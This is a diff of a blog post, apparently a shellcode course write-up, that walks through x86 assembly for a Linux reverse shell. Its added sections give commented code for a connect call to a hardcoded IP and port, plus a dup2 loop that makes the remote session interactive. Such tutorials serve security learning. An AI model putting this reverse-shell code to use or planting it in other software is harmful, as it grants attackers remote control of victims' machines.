@@ -15,15 +15,17 @@ A Reverse shell is a form of malware which grants remote access to a system thro
 The second assignment from the seven requires the creation of a Reverse Shell through the Assembly language, and converting such into [shellcode](https://es.wikipedia.org/wiki/Shellcode). Moreover, it is required to write a wrapper in any language of preference that is capable of 
 easily configuring the port.
 
+If you were able to follow the previous post with ease, this should be a charm!
+
 #### Theory 
 
 In order to create a Reverse Shell, 4 main functions are required:
 
 + Socket
 
-+ Dup2
-
 + Connect
+
++ Dup2
 
 + Execve
 
@@ -68,7 +70,51 @@ registers. Finally, the value of protocol (EDX) isn't actually very relevant. Du
 
 ##### Connect
 
-###### 
+###### Initiate a connection on a socket
+
+The following step is to initiate a connection on the socket. The arguments according the man page are the following: ```int connect(int sockfd, const struct sockaddr *addr, 
+socklen_t addrlen);```. As you may see, the required flags are quite the same to the bind syscall in the previous post. Nonetheless, if you remember, in the previous post a value of 0 was pushed within the IP protocol argument, value which will be essential this time, therefore, the order will be the following:
+
++ 0            (As it is required to push 0, the instruction PUSH EDX will be used.)
++ IP Address   (As this is a reverse shell, it is required to point to a specific address. Due to the aforementioned, this will be set to our IP within hex.)
++ Chosen Port  (The chosen port will be pushed in hex as a word.)
++ AF_INET
+
+```term
+connect:
+
+      push word 362           ; Pushes word 362 (connect) into the stack
+      pop ax                  ; Pops such word into ax so there are no nulls.
+      mov ebx, esi            ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
+      push edx                ; Pushes 0.
+      push dword 0x8b64a8c0   ; Pushes 192.168.100.139 in hex as a DWORD.
+      push word 0x2823        ; Pushes 9000 in hex as a WORD.
+      push word 0x02          ; Pushes AF_INET into the stack.
+      mov ecx, esp            ; Copies the value of ESP into ECX.
+      mov dl, 30              ; The value 30 is inserted into DL, as this argument requires the length of the struct.
+      int 0x80                ; Call to kernel.
+```
+
+##### Dup2
+
+###### Duplicate a file descriptor
+
+Once again, we encounter ourselves with our buddy Dup2. This syscall will make our communication with the compromised device interactive by copying into the file descriptors STDIN (0), STDOUT (1), and STDERR (2). Just like the last time, a loop that is executed three times will be implemented which performs such task as long as the zero flag (ZF) is not set.
+
+```term
+dup2:
+
+      xor eax, eax            ; Zeroes out EAX.
+
+      push word 63            ; Pushes word 63 (dup2) into the stack.
+      pop ax                  ; Pops such word into ax so there are no nulls.
+      mov ebx, esi            ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
+      dec cl                  ; Decrements cl in order to set the zero flag (ZF)
+      int 0x80                ; Call to kernel.
+
+      jnz dup2                ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.
+```
+
 
 #### EndGame
 
